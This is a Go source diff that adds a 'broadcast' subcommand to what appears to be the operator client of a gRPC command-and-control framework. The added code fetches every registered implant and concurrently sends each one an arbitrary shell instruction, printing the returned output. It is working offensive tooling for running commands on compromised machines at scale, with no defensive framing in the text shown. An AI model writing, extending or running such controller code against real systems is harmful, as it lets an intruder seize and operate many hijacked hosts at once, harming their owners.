@@ -7,6 +7,7 @@ import (
 	"log"
 	"os"
 	"strings"
+	"sync"
 	"text/tabwriter"
 
 	"github.com/urfave/cli/v3"
@@ -122,6 +123,48 @@ func main() {
 					// 6. Print the results
 					fmt.Printf("[+] Results from %s:\n%s\n", targetID, res.Out)
 
+					return nil
+				},
+			},
+			{
+				Name:  "broadcast",
+				Usage: "Send a command to ALL registered implants",
+				Action: func(ctx context.Context, c *cli.Command) error {
+					instruction := strings.Join(c.Args().Slice(), " ")
+					if instruction == "" {
+						return fmt.Errorf("error: what command do you want to broadcast?")
+					}
+
+					list, err := client.ListRegisteredImplants(ctx, &grpcapi.Empty{})
+					if err != nil {
+						return err
+					}
+
+					fmt.Printf("[*] Broadcasting '%s' to %d implants...\n", instruction, len(list.Implants))
+
+					var wg sync.WaitGroup
+					for _, imp := range list.Implants {
+						wg.Add(1)
+
+						go func(implantID string) {
+							defer wg.Done()
+
+							req := &grpcapi.Command{
+								ImplantId: implantID,
+								In:        instruction,
+							}
+
+							res, err := client.RunCommand(ctx, req)
+							if err != nil {
+								fmt.Printf("[!] %s: Failed -> %v\n", implantID, err)
+								return
+							}
+							fmt.Printf("[+] %s: Output -> %s\n", implantID, res.Out)
+						}(imp.Id)
+					}
+
+					wg.Wait()
+					fmt.Println("[*] Broadcast complete.")
 					return nil
 				},
 			},
